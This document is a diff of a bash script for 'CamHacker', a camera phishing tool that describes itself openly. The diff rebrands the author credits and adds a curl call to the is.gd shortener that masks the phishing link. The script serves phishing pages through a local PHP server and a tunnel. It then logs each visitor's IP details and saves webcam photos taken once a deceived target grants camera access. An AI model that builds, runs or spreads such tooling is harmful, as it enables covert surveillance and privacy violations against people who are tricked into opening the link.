@@ -1,14 +1,14 @@
 #!/bin/bash
 
 # CamHacker
-# Version    : 1.2.5
-# Description: CamHacker is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
-# Author     : KasRoudra
-# Github     : https://github.com/KasRoudra
-# Email      : kasroudrakrd@gmail.com
-# Credits    : Noob-Hackers, TechChipNet, LinuxChoice
-# Date       : 5-09-2021
-# Language   : Shell
+# Version    : 2.1
+# Description: CameraHackHack is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
+# Author     : KasRoudra, SUMAN, Online Hacking
+# Github     : https://github.com/OnlineHacKing/
+# Email      : info@onlinehacking.in
+# Credits    : Noob-Hackers, TechChipNet, LinuxChoice, CamHacker
+# Date       : 21-04-2022
+# Language   : Shell, HTML, Css
 # Portable File
 # If you copy, consider giving credit! We keep our code open source to help others
 
@@ -38,6 +38,7 @@ cwd=`pwd`
 
 # Logo 
 logo="
+${green}    SUMAN       Online Hacking
 ${cyan} 
 ${cyan}     ██████  ███████ ███    ███        
 ${cyan}     ██      ██   ██ ████  ████        
@@ -51,7 +52,7 @@ ${purple}          ██   ██ ██   ██ ██      ██  ██
 ${purple}          ███████ ███████ ██      █████    
 ${purple}          ██   ██ ██   ██ ██      ██  ██   
 ${purple}          ██   ██ ██   ██  ██████ ██   ██   
-${purple}                                                          
+${purple}     
 "
 
 # Package Installer
@@ -127,19 +128,22 @@ replacer() {
         break
     fi
     done
-    echo -e "${info}Your urls are: \n"
+    echo -e "${info}Your urls are: ━━━━━━━━━━━━━━━━ \n"
     sleep 1
-    echo -e "${success}LINK 1 > ${1}\n"
+    echo -e "${success}Link 1 : ${1}\n"
     sleep 1
     netcheck
-    
+    masked=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${1})
+    if ! [[ -z $masked ]]; then
+        echo -e "${success}URL 2 > ${masked}\n"
+    fi
 }
 
 # Prevent ^C
 stty -echoctl
 
 # Detect UserInterrupt
-trap "echo -e '\n${success}Thanks for using!\n'; exit" 2
+trap "echo -e '\n${success}Thanks for Using! Visit Site : onlinehacking.in\n'; exit" 2
 
 # Termux
 if [[ -d /data/data/com.termux/files/home ]]; then
@@ -358,8 +362,8 @@ fi
 
 # Ngrok Authtoken
 if ! [[ -e $HOME/.ngrok2/ngrok.yml ]]; then
-    echo -e "\n${ask}Enter your ngrok authtoken:"
-    printf "${cyan}\nCamera${nc}@${cyan}Hack ${red}$ ${nc}"
+    echo -e "\n${ask}Enter your ngrok authtoken (Enter to Skip):"
+    printf "${cyan}\nOnline${nc}@${cyan}Hacking ${red}$ ${nc}"
     read auth
     if [ -z $auth ]; then
         echo -e "\n${error}No authtoken!\n\007"
@@ -378,7 +382,7 @@ sleep 1
 bash OnlineHacking/logo2.sh
 
 sleep 1
-printf "${cyan}\nCamera${nc}@${cyan}Hack ${red}$ ${nc}"
+printf "${cyan}\nOnline${nc}@${cyan}Hacking ${red}$ ${nc}"
 read option
 # Select template
     if echo $option | grep -q "1"; then
@@ -386,7 +390,7 @@ read option
         break
     elif echo $option | grep -q "2"; then
         dir="fest"
-        printf "\n${ask}Enter festival name:${cyan}\n\nCamera${nc}@${cyan}Hack ${red}$ ${nc}"
+        printf "\n${ask}Enter festival name:${cyan}\n\nOnline${nc}@${cyan}Hacking ${red}$ ${nc}"
         read fest_name
         if [ -z $fest_name ]; then
             echo -e "\n${error}Invalid input!\n\007"
@@ -397,7 +401,7 @@ read option
         fi
     elif echo $option | grep -q "3"; then
         dir="live"
-        printf "\n${ask}Enter youtube video ID:${cyan}\n\nCamera${nc}@${cyan}Hack ${red}$ ${nc}"
+        printf "\n${ask}Enter youtube video ID:${cyan}\n\nOnline${nc}@${cyan}Hacking ${red}$ ${nc}"
         read vid_id
         if [ -z $vid_id ]; then
             echo -e "\n${error}Invalid input!\n\007"
@@ -415,7 +419,7 @@ read option
             export TN="Cloudflared"
         fi
     elif echo $option | grep -q "i"; then
-        printf "\n${ask}Enter Directory:${cyan}\n\nCamera${nc}@${cyan}Hack ${red}$ ${nc}"
+        printf "\n${ask}Enter Directory:${cyan}\n\nOnline${nc}@${cyan}Hacking ${red}$ ${nc}"
         read dire
         if ! [ -d $dire ]; then
             echo -e "\n${error}Invalid directory!\n\007"
@@ -429,12 +433,12 @@ read option
         clear
         echo -e "$logo"
         echo -e "$red[ToolName]  ${cyan}  :[CameraHack]
-$red[Version]    ${cyan} :[2.2]
+$red[Version]    ${cyan} :[2.1]
 $red[Description]${cyan} :[Camera Phishing tool]
-$red[Author]     ${cyan} :[KasRoudra]
-$red[Github]     ${cyan} :[https://github.com/KasRoudra] 
-$red[Messenger]  ${cyan} :[https://m.me/KasRoudra]
-$red[Email]      ${cyan} :[kasroudrakrd@gmail.com]"
+$red[Author]     ${cyan} :[KasRoudra, Suman, OnlineHacking]
+$red[Github]     ${cyan} :[https://github.com/OnlineHacKing] 
+$red[Website]    ${cyan} :[https://www.onlinehacking.in/]
+$red[Telegarm]   ${cyan} :[https://t.me/onlinehacking]"
 printf "${cyan}\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
 read about
     elif echo $option | grep -q "m"; then
@@ -467,11 +471,11 @@ if $termux; then
 echo -e "\n${info}If you haven't turned on hotspot, please enable it!"
 sleep 3
 fi
-echo -e "\n${info}Starting php server at localhost:7777....\n"
+echo -e "\n${info}Starting PHP Server at 127.0.0.1:7777\n"
 netcheck
 php -S 127.0.0.1:7777 > /dev/null 2>&1 &
 sleep 2
-echo -e "${info}Starting tunnelers......\n"
+echo -e "${info}Starting link tunnelers......\n"
 if [ -e "$HOME/.cffolder/log.txt" ]; then
 rm -rf "$HOME/.cffolder/log.txt"
 fi
@@ -534,7 +538,7 @@ rm -rf ip.txt
 echo -e "${info}Waiting for target. ${cyan}Press ${red}Ctrl + C ${cyan}to exit...\n"
 while true; do
     if [[ -e "ip.txt" ]]; then
-        echo -e "\007${success}Target Opened the Link!\n"
+        echo -e "\007${success}Target opened the link!\n"
         while IFS= read -r line; do
             echo -e "${green}[${blue}*${green}]${yellow} $line"
         done < ip.txt
@@ -544,10 +548,10 @@ while true; do
     fi
     sleep 0.5
     if [[ -e "log.txt" ]]; then
-        echo -e "\007${success}Image downloaded! Check directory!\n"
+        echo -e "\007${success}IMAGE FILE RECEIVED ! Download...\n"
         file=`ls | grep png`
         mv -f $file $FOL
         rm -rf log.txt
-   if
+    fi
     sleep 0.5
 done 
